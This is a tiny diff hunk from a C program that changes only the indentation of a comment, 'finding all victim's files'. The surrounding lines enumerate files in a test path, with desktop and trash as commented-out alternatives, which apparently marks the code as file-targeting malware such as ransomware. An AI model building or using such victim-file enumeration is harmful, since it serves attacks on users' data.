@@ -48,7 +48,7 @@ int main(){
     char * media = get_media_path(username);
     char * test_path = get_test_path(desktop);
 
-	  /* finding all victim's files */
+    /* finding all victim's files */
     find_files(&files, test_path);
     //find_files(&files, desktop);
     //find_files(&files, trash);
